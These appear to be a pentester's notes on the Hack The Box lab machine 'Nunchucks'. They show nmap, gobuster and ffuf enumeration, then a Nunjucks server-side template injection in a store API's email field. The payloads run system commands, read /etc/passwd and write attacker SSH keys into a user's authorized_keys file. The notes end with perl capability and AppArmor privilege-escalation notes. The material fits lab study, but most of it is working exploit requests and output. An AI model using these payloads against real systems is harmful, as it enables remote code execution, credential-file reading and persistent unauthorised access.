```r
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| tls-nextprotoneg:
|_  http/1.1
| tls-alpn:
|_  http/1.1
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Whatweb
http://10.129.95.252 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.95.252], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.95.252], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]

[**support@nunchucks.htb**](mailto:support@nunchucks.htb)

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/privacy              (Status: 200) [Size: 19134]
/login                (Status: 200) [Size: 9172]
/terms                (Status: 200) [Size: 17753]
/signup               (Status: 200) [Size: 9488]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/Privacy              (Status: 200) [Size: 19134]
/Login                (Status: 200) [Size: 9172]
/Terms                (Status: 200) [Size: 17753]
/Assets               (Status: 301) [Size: 179] [--> /Assets/]
/Signup               (Status: 200) [Size: 9488]
/SignUp               (Status: 200) [Size: 9488]
/signUp               (Status: 200) [Size: 9488]
200      GET      187l      683w     9488c https://10.129.95.252/signup
200      GET        9l       79w     4399c https://10.129.95.252/assets/images/customer-logo-5.png
200      GET       37l      159w    12917c https://10.129.95.252/assets/images/testimonial-4.jpg
200      GET      351l      795w     6951c https://10.129.95.252/assets/css/magnific-popup.css
200      GET       15l       86w     3909c https://10.129.95.252/assets/images/customer-logo-6.png
200      GET       22l      149w    12481c https://10.129.95.252/assets/images/testimonial-6.jpg
200      GET       44l      411w     5958c https://10.129.95.252/assets/js/jquery.easing.min.js
200      GET        9l       79w     4382c https://10.129.95.252/assets/images/customer-logo-2.png
200      GET       35l      286w    21609c https://10.129.95.252/assets/images/details-2.png
200      GET       14l       94w     4275c https://10.129.95.252/assets/images/customer-logo-4.png
200      GET       12l       77w     4299c https://10.129.95.252/assets/images/customer-logo-3.png
200      GET       12l       78w     4155c https://10.129.95.252/assets/images/customer-logo-1.png
200      GET       15l       33w      530c https://10.129.95.252/assets/js/login.js
200      GET      250l     1863w    19134c https://10.129.95.252/privacy
200      GET      618l     1532w    22256c https://10.129.95.252/assets/css/swiper.css
200      GET       60l      407w    25133c https://10.129.95.252/assets/images/details-1.png
200      GET       32l      178w    14726c https://10.129.95.252/assets/images/testimonial-3.jpg
200      GET      183l      475w     4957c https://10.129.95.252/assets/js/scripts.js
200      GET       29l      175w    13737c https://10.129.95.252/assets/images/testimonial-5.jpg
200      GET       23l      223w    16239c https://10.129.95.252/assets/images/testimonial-1.jpg
200      GET       29l      164w    13338c https://10.129.95.252/assets/images/testimonial-2.jpg
200      GET        3l      297w    21680c https://10.129.95.252/assets/js/jquery.magnific-popup.js
200      GET     1620l     3174w    29776c https://10.129.95.252/assets/css/styles.css
200      GET       59l      430w    27406c https://10.129.95.252/assets/images/details-3.png
200      GET      183l      662w     9172c https://10.129.95.252/login
200      GET      245l     1737w    17753c https://10.129.95.252/terms
200      GET      142l      832w    69576c https://10.129.95.252/assets/images/details-lightbox.jpg
200      GET      125l      669w    53396c https://10.129.95.252/assets/images/introduction.jpg
200      GET     4396l     7477w    70117c https://10.129.95.252/assets/css/fontawesome-all.css
200      GET        7l      688w    63467c https://10.129.95.252/assets/js/bootstrap.min.js
200      GET        2l     1297w    89476c https://10.129.95.252/assets/js/jquery.min.js
200      GET       13l     1203w   125617c https://10.129.95.252/assets/js/swiper.min.js
200      GET      606l     2766w   241227c https://10.129.95.252/assets/images/header.png
200      GET       16l       36w      592c https://10.129.95.252/assets/js/signup.js
301      GET       10l       16w      179c https://10.129.95.252/assets => https://10.129.95.252/assets/
200      GET    10298l    20456w   199412c https://10.129.95.252/assets/css/bootstrap.css
301      GET       10l       16w      193c https://10.129.95.252/assets/images => https://10.129.95.252/assets/images/
200      GET      356l     1823w   645104c https://10.129.95.252/assets/images/favicon.ico
200      GET      546l     2271w    30589c https://10.129.95.252/
200      GET      250l     1863w    19134c https://10.129.95.252/Privacy
200      GET      183l      662w     9172c https://10.129.95.252/Login
301      GET       10l       16w      187c https://10.129.95.252/assets/css => https://10.129.95.252/assets/css/
301      GET       10l       16w      185c https://10.129.95.252/assets/js => https://10.129.95.252/assets/js/
200      GET      245l     1737w    17753c https://10.129.95.252/Terms
301      GET       10l       16w      179c https://10.129.95.252/Assets => https://10.129.95.252/Assets/
301      GET       10l       16w      193c https://10.129.95.252/Assets/images => https://10.129.95.252/Assets/images/
301      GET       10l       16w      187c https://10.129.95.252/Assets/css => https://10.129.95.252/Assets/css/
301      GET       10l       16w      185c https://10.129.95.252/Assets/js => https://10.129.95.252/Assets/js/
200      GET      187l      683w     9488c https://10.129.95.252/Signup
200      GET      187l      683w     9488c https://10.129.95.252/SignUp
200      GET      187l      683w     9488c https://10.129.95.252/signUp
200      GET      250l     1863w    19134c https://10.129.95.252/PRIVACY


```

## Subdomain discovery
```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://nunchucks.htb/ -H "Host: FUZZ.nunchucks.htb" -fl 547

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nunchucks.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.nunchucks.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 547
________________________________________________

store                   [Status: 200, Size: 4029, Words: 1053, Lines: 102, Duration: 129ms]

```

# SSTI Research
```r
py sstimap.py -u 'https://nunchucks.htb/' --crawl 5 --forms

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; legacy_engines: 2; engines: 17
[*] Loaded request body types: 4

[*] Starting page crawler...
[*] Skipping: https://fonts.gstatic.com
[*] Skipping: https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400;1,600&display=swap
[+] URL found: https://nunchucks.htb/index.html
[+] URL found: https://nunchucks.htb/signup
[+] URL found: https://nunchucks.htb/terms
[+] URL found: https://nunchucks.htb/privacy
[*] Skipping: mailto:support@nunchucks.htb
[+] URL found: https://nunchucks.htb/signup
[+] URL found: https://nunchucks.htb/terms
[+] URL found: https://nunchucks.htb/login
[+] URL found: https://nunchucks.htb/privacy.html
[+] URL found: https://nunchucks.htb/terms.html
[+] URL found: https://nunchucks.htb/privacy.html
[+] URL found: https://nunchucks.htb/terms.html
[*] Starting form detection...
[-] Invalid POST form with blank data detected
[-] Invalid POST form with blank data detected
[*] Scanning url: https://nunchucks.htb/terms
[-] Tested parameters appear to be not injectable.
[*] Scanning url: https://nunchucks.htb/login
[-] Tested parameters appear to be not injectable.
[*] Scanning url: https://nunchucks.htb/privacy.html
[-] Tested parameters appear to be not injectable.
[*] Scanning url: https://nunchucks.htb/signup
[-] Tested parameters appear to be not injectable.
[*] Scanning url: https://nunchucks.htb/index.html
[-] Tested parameters appear to be not injectable.
[*] Scanning url: https://nunchucks.htb/
[-] Tested parameters appear to be not injectable.
[*] Scanning url: https://nunchucks.htb/privacy
[-] Tested parameters appear to be not injectable.
[*] Scanning url: https://nunchucks.htb/terms.html
[-] Tested parameters appear to be not injectable.
```
- SSTImap was not successful to identify nothing on store., however custom request in BURP:

```r
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=5GA3DXPC3Nkwi3iFUtZ-C1IB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Content-Length: 19
Origin: https://store.nunchucks.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close

{"email":"{{8*8}}"}

---
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 21 Jan 2024 11:27:26 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 75
Connection: close
X-Powered-By: Express
ETag: W/"4b-1xU8jC+i0X16OXX0Sn4PM1Qwrl8"

{"response":"You will receive updates on the following email address: 64."}
```

- details on escape sequences: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
```
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=5GA3DXPC3Nkwi3iFUtZ-C1IB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Content-Length: 126
Origin: https://store.nunchucks.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close

{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}"}

```
- escape \ character helped to request this json data

# SSH Key Injection
```
{"email":"0xdf{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing > /home/david/.ssh/authorized_keys')\")()}}@htb.htb"}

{"email":"0xdf{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDG9E/9+dYv6jollQhg1uDZucYVXhOzC4q/W2ErUiV0d8SrAh5Rlo1JJAv7K14QEN1fdEsxNjfeeJXskWcaC6aHXtIFyxDMy7Hn4/UZZU38CgmxWMOXYKowmWaI+cnpXArilf4NLOaIFjcipbrNY8fpLkt7IFVR2blEzp90T4R+CuPPMs+XCanTMIOVGhUJQ0p3lI3093zNoi7/cYFETLUwt72ar59H6/Xq0wrrR8NN5XFxGm89RCi34YDwJ3byQU+9ML+2eilJ2LMYsWRkIqFCEbpkkke35deOfCfPAgTonMts7Mkcrr1+rpvRQJ6lsUsmhtO7ZV2LEKj9EHVp+qeecDssiowZJvcRIwrXoRCIxJsjooB1YGqTlHe7BRYoYynMSoKLZgtMwqejshH07IgqMdCeafXALRefngPdfracHyu2dyt/ieYJmjGUyxM3lXu6InOcNpFX6xKY4Yyt2zjL6v24Ik+k9iV5ziVR93JobaZFSfWlA5vhrltG8MW6IDM= volt@arch > /home/david/.ssh/authorized_keys')\")()}}@htb.htb"}

ssh -i nun_rsa david@$RHOST
```

# Privilege escalation
Perl has cap_setuid however, basic GTFObin doesn't work. There are custom rules set for `perl` with AppArmor:

```r
getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep

---
david@nunchucks:/dev/shm$ cd /etc/apparmor.d
david@nunchucks:/etc/apparmor.d$ ls
abstractions  force-complain  lsb_release      sbin.dhclient  usr.bin.man   usr.sbin.ippusbxd  usr.sbin.rsyslogd
disable       local           nvidia_modprobe  tunables       usr.bin.perl  usr.sbin.mysqld    usr.sbin.tcpdump
david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,
}
```
- AppArmor is running -> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass